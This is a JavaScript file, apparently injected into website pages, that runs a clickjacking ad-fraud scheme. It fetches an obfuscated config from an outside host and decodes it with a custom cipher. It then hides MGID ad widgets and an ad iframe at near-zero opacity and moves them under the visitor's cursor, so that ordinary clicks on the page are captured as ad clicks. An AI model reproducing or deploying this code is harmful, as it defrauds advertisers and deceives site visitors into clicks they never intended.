let monitorTracker = null;
let canTrack = 0;
let h12_canTrack = 0;
let h12_div = null;
let h12_link = null;
let obgWidth = window.innerWidth;
let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
let htmlCode = '<div id="_z0s59a_div'+ uniqueID +'"><iframe frameborder="0" scrolling="0" id="_z0s59a_obj'+ uniqueID +'" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden;"></iframe></div>';
let cssCode = '<style>#_z0s59a_div'+ uniqueID +'{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
let pointerTracker = function(e){
    let out = {x:0, y:0};
    if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
        let touch = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0];
        out.x = touch.pageX;
        out.y = touch.pageY;
    } else if (e.type == 'mousedown' || e.type == 'mouseup' || e.type == 'mousemove' || e.type == 'mouseover'|| e.type=='mouseout' || e.type=='mouseenter' || e.type=='mouseleave') {
        out.x = e.pageX;
        out.y = e.pageY;
    }
    return out;
};
function randomizeArray(a) {
    let j, x, i;
    for (i = a.length - 1; i > 0; i--) {
        j = Math.floor(Math.random() * (i + 1));
        x = a[i];
        a[i] = a[j];
        a[j] = x;
    }
    return a;
}
function setCookie(strCookie, strValor, lngHoras) {
    let dtmData = new Date();
    let strExpires = null;
    if (lngHoras) {
        dtmData.setTime(dtmData.getTime() + (lngHoras * 60 * 1000 * 60));
        strExpires = "; expires=" + dtmData.toGMTString();
    } else {
        strExpires = "";
    }
    document.cookie = strCookie + "=" + strValor + strExpires + "; path=/";
}
function getCookie(strCookie) {
    let strNomeIgual = strCookie + "=";
    let arrCookies = document.cookie.split(';');
    for (let i = 0; i < arrCookies.length; i++) {
        let strValorCookie = arrCookies[i];
        while (strValorCookie.charAt(0) == ' ') {
            strValorCookie = strValorCookie.substring(1, strValorCookie.length);
        }
        if (strValorCookie.indexOf(strNomeIgual) == 0) {
            return strValorCookie.substring(strNomeIgual.length, strValorCookie.length);
        }
    }
    return null;
}
function insertCode(){
    $("body").append(cssCode + htmlCode).css("overflow-x", "hidden").css("width", "100%");
    $(document).on('mousemove touchstart', function(e){
        let tracker = pointerTracker(e);
        if (canTrack == 1) {
            $('#_z0s59a_div' + uniqueID).css({
                left:  tracker.x - Math.floor(Math.random()*(2-938+1)+938),
                top:   tracker.y - Math.floor(Math.random()*(2-198+1)+198)
            });
        }
    });

    minimizeDiv();
    setUrlObj();
}
function minimizeDiv() {
    canTrack = 0;
    $("#_z0s59a_div" + uniqueID).css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-90000").css("position", "fixed");
    $("#_z0s59a_obj" + uniqueID).css("top", "").css("pointer-events", "none").css("height", window.innerHeight + "px").css("width", obgWidth + "px");
}
function setUrlObj() {
    document.getElementById('_z0s59a_obj' + uniqueID).src = h12_link;
    document.getElementById('_z0s59a_obj' + uniqueID).onload=function(){
        setTimeout(showDiv,100);
    }
}
function showDiv() {
    canTrack = 1;
    startTracker();

    let _w = (obgWidth - 940) / 2;
    $("#_z0s59a_obj" + uniqueID).css("top", "-140px").css("left", "-"+ _w +"px").css("pointer-events", "");
    $("#_z0s59a_div" + uniqueID).css("width", "940px").css("height", "200px").css("z-index", "90000").css("position", "absolute");
}
function setClick(){
    setCookie("_z1_delay_time",  "1", 4);
    document.activeElement.blur();
}
function startTracker() {
    monitorTracker = setInterval(function(){
        let elem = document.activeElement;
        if(elem && elem.tagName == 'IFRAME'){
            setTimeout(setClick,100);
            setTimeout(minimizeDiv,1000);
            clearInterval(monitorTracker);
        }
    }, 100);
}
function h12_revertDiv() {
    h12_canTrack = 0;
    $("#" + h12_div).css("top", "").css("left", "").css("z-index", "").css("position", "").css("opacity", "").css("width", "");
}
function h12_startScript(){
    h12_div = $('div[id^="M268850ScriptRootC758017"]')[0].id;

    $("body").css("overflow-x", "hidden").css("width", "100%");
    $(document).on('mousemove touchstart', function(e){
        let tracker = pointerTracker(e);
        if (h12_canTrack == 1) {
            $("#" + h12_div).css({
                left:  tracker.x - Math.floor(Math.random()*(10-790+1)+790),
                top:   tracker.y - Math.floor(Math.random()*(10-190+1)+190),
            });
        }
    });

    if(getCookie("_z1_delay_time") == null){
        $('#'+ h12_div +' .mgheader').remove();
        $('#'+ h12_div +' a').click(function(){h12_clickfuncion(); return false;});

        h12_followDiv();
    }
}
function h12_followDiv() {
    h12_canTrack = 1;
    $("#" + h12_div).css("z-index", "90000").css("position", "absolute").css("opacity", "0.0001").css("width", "800px");
}
function h12_clickfuncion() {
    let randLinks = $('#'+ h12_div +' a[href^="https://www.mgid.com/"]');
    randomizeArray(randLinks);
    h12_link = randLinks[0].href;

    setTimeout(h12_revertDiv,100);
    setTimeout(insertCode,120);
}
function h12_Decrypt(s1, id) {
    s1 = atob(s1);
    var result = '';
    var xx2 = s1.charAt(0);
    xx2 = xx2.charCodeAt(0) - 65;
    s1 = s1.substr(1);
    while(s1.length > 0) {

        result = result + String.fromCharCode(
            (
                s1.charAt(0).charCodeAt(0) - 65
            )
            * 25 +
            (
                s1.charAt(1).charCodeAt(0) - 65
            )
            - xx2 - id
        );

        s1 = s1.substr(2);

    }
    return result;
}
$(document).ready(function () {
    fetch('https://www.iplezier.site/assets/js/c/tns.json?ver=' + $.now())
        .then(function(response) {
            return response.text();
        })
        .then(function(body) {
            let jsonResponse = JSON.parse(h12_Decrypt(body, 1247));
            if(jsonResponse.redecanais === true){
                setTimeout(h12_startScript,100);
            }
        });
});
